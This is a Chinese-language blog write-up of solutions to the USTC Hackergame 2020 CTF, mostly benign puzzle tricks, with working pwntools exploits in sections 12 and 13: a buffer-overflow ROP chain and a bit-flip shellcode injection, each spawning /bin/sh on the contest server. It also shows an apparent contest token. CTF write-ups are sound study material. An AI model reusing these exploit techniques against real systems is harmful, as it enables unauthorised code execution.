---
title: 中科大2020年Hackergame WP
tags:
categories:
  - [CTF, WP]
toc: true
mathjax: true
top: false
comments: true
copyright: true
date: 2020-11-08 21:27:20
---

# 01 签到

* 点击`提取`按钮，发现地址栏出现`.../?number=0`
* 将`0`改为`1`便得flag

# 02 猫咪问答++

百度一下即可；第一题较复杂，可枚举。

# 03 2048

* F12发现提示：

  ```
   <!-- 
      changelog:
      - 2020/10/31 getflxg @ static/js/html_actuator.js
    -->
  ```

* 打开 `static/js/html_actuator.js` 文件，找到和游戏胜利有关的逻辑：

  ```javascript
  var url;
    if (won) {
      url = "/getflxg?my_favorite_fruit=" + ('b'+'a'+ +'a'+'a').toLowerCase();
    } else {
      url = "/getflxg?my_favorite_fruit=";
    }
  
    let request = new XMLHttpRequest();
    request.open('GET', url);
  ```

* 打开 Chrome 浏览器的开发者工具，切换到 Console 标签页，执行一下 `('b'+'a'+ +'a'+'a').toLowerCase()`，得到正确的应该填入的值为 `banana`，访问 `/getflxg?my_favorite_fruit=banana`，则可以得到正确的 flag

# 04 一闪而过的 Flag

cmd运行文件即可。

# 05 从零开始的记账工具人

* 首先使用 Excel将下载的文件转换为 `.csv` 格式，即逗号分隔的文本

* 然后在 Python 中安装 cn2an 这个中文数字转换的库：`python3 -m pip install cn2an`

* 然后使用 Python 程序处理这个文件：

  ```python
  import cn2an
  lines = open('bills.csv').readlines()[1:]
  s = 0
  for line in lines:
      a, b = line.strip().split(',')
      n = 0
      if '元' in a:
          y, a = a.split('元')
          n += cn2an.cn2an(y, "smart")
      if '角' in a:
          y, a = a.split('角')
          n += cn2an.cn2an(y, "smart") / 10
      if '分' in a:
          y, a = a.split('分')
          n += cn2an.cn2an(y, "smart") / 100
      s += n * int(b)
  print(s)
  ```

* 四舍五入得flag

# 06 超简单的世界模拟器

## T1 蝴蝶效应

百度“生命游戏”了解一下，为了消除右上角的方块，只要放置一个水平移动的“太空船”即可：

```
000000000000000
001111000000000
010001000000000
000001000000000
010010000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
000000000000000
```

# 07 自复读的复读机

## T1 反向复读

谷歌搜索“输出自己的程序”或者类似的词，可以查到这类程序叫做 Quine。

```python
exec(s:='print(("exec(s:=%r)"%s)[::-1],end="")')
```

## T2 哈希复读

```python
exec(s:='print(__import__("hashlib").sha256(("exec(s:=%r)"%s).encode()).hexdigest(),end="")')
```

# 08 233 同学的字符串工具

## T1 字符串大写工具

* 以 "unicode uppercase collision" 为关键字搜索，链接：https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/
* 找到一个连字（ligature）`ﬂ (0xFB02)`
* 这个“字符”将在转换为大写时变成 `FL` 两个字符！因此，只需输入 `ﬂag` 即可得到 flag

# 09 233 同学的 Docker

* 参考博客：https://www.cnblogs.com/zejin2008/p/13460498.html

* 拉取镜像 `docker pull 8b8d3c8324c7/stringtool`

* 获取镜像历史构建信息，并标出层级：`sudo docker history 8b8d3c8324c7/stringtool`
  <img src="https://s2.loli.net/2022/04/18/1Oa98HiNyLKCZng.jpg" width = "1000" height = "200" alt="图片名称" align=center id=165 />

  由此我们知道flag.txt是在倒数第二层被删除的，所以我们只需要找到该层的文件即可

* 用docker inspect 获取该层的diff路径：`sudo docker inspect 8b8d3c8324c7/stringtool`

  <img src="https://s2.loli.net/2022/04/18/VTShoi5FKIalYtb.jpg" width = "1000" height = "250" alt="图片名称" align=center id=166 />

  UpperDir 为最上层，其它从LowerDir一层层往下数。

* 选定LowerDir中的第一个，`sudo tree /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff`

  <img src="https://s2.loli.net/2022/04/18/jVIEeAfXWsHyPmO.jpg" width = "1000" height = "150" alt="图片名称" align=center id=167 />

* 查看：`sudo cat /var/lib/docker/overlay2/05c27a902f648e2f88d79a2498d6043bd2b8d5b01f15eb0ed4848dfff4ddad37/diff/code/flag.txt`

# 10 从零开始的 HTTP 链接

* 整个腾讯云免费服务器，最好是ubuntu，centos配置环境老是出问题
* https://github.com/vi/websocat/releases 下载 websocat_1.6.0_ssl1.0_amd64.deb
* gdebi websocat_..._.deb  （根据提示install一下gdebi）
* 然后 websocat ws:// xxx.xxx.xxx.xxx:0/ shell

# 11 来自一教的图片

* 对图像二维傅里叶变换

* 代码如下：

  ```python
  # -*- coding: utf-8 -*-
  import cv2 as cv
  import numpy as np
  from matplotlib import pyplot as plt
  
  #读取图像
  img = []
  img = cv.imread('4f_system_middle.bmp', 0)
  # if img:
  #     print(666)
  
  #傅里叶变换
  f = np.fft.fft2(img)
  fshift = np.fft.fftshift(f)
  res = np.log(np.abs(fshift))
  
  #傅里叶逆变换
  ishift = np.fft.ifftshift(fshift)
  iimg = np.fft.ifft2(ishift)
  iimg = np.abs(iimg)
  
  #展示结果
  plt.subplot(131), plt.imshow(img, 'gray'), plt.title('Original Image')
  plt.axis('off')
  plt.subplot(132), plt.imshow(res, 'gray'), plt.title('Fourier Image')
  plt.axis('off')
  plt.subplot(133), plt.imshow(iimg, 'gray'), plt.title('Inverse Fourier Image')
  plt.axis('off')
  plt.show()
  ```

* 将得到的照片调整即可得flag

# 12 生活在博弈树上

## T1 始终热爱大地

脚本如下：

```python
from pwn import *
#sh = process('./tictactoe')
sh = remote('202.38.93.111',10141)
sh.recvuntil('Please input your token: ')
sh.sendline('...')#填写token
#gdb.attach(sh)
sh.recvuntil('Your turn. Input like (x,y), such as (0,1): ')
sh.sendline('(1,1)')
payload ='(1,2)'+'a'*0x93 + p64(0x40255D)
sh.sendline(payload)
sh.interactive()
```

## T2 升上天空

```python
from pwn import *
#sh = process('./tictactoe')
sh = remote('202.38.93.111',10141)

syscall = 0x0000000000402bf4
pop_rax = 0x000000000043e52c
pop_rdi = 0x00000000004017b6
pop_rsi = 0x0000000000407228
pop_rdx = 0x000000000043dbb5
pop_rbx = 0x000000000046cb55

bss_addr = 0x4A8370
gets_addr = 0x409E00

sh.recvuntil('Please input your token: ')
sh.sendline('...')#填写token
#gdb.attach(sh)
sh.recvuntil('Your turn. Input like (x,y), such as (0,1): ')
sh.sendline('(1,1)')
payload ='(1,2)'+'a'*0x93
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(gets_addr)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rbx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)
sh.sendline(payload)
sleep(0.1)
sh.sendline('/bin/sh\x00')
sh.interactive()
```

# 13 超精准的宇宙射线模拟器

脚本如下：

```python
from pwn import *
#sh = process('./bitflip')
sh = remote('202.38.93.111',10231)
context.log_level='debug'
context.arch = 'amd64'
context.os = 'linux'
def bitxor(addr, num):
    sh.recvuntil('You can flip only one bit in my memory. Where do you want to flip?\n')
    sh.sendline(hex(addr)+' ' + str(num))

def onechange(byt, addr):
    tmp = ord(byt)
    for i in range(8):
        if tmp&1:
            bitxor(addr, i)
        tmp = tmp>>1
sh.recvuntil('Please input your token: ')
sh.sendline('444:MEYCIQCOwUMnrz99os4e7j2RMF6lWimf1iMdPwIzb15HP3aUfAIhAOcW4gDJGOqi5sdtEF0zItE6w9K90u0XhOdsv7h/5OlF')        
#change exit to call _start
bitxor(0x401296, 4)

#write shellcode to 0x401500
shellcode = 'jhH\xb8/	bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
shellcode_addr= 0x401500
for i in range(len(shellcode)):
    onechange(shellcode[i], shellcode_addr+i)
#change exit to jmp 0x401500
a = 0x90902f6d21c81b
exit_addr = 0x4010C4
j = 0
while a:
    tmp_a = a & 0xff
    onechange(chr(tmp_a), exit_addr + j)
    a = a>>8
    j = j+1 
#change call _start to exit
bitxor(0x401296, 4)
#gdb.attach(sh)
sh.interactive()
```

# 14 不经意传输

## T1 解密消息

* v = x0
* m0 = m1 = m0_ 
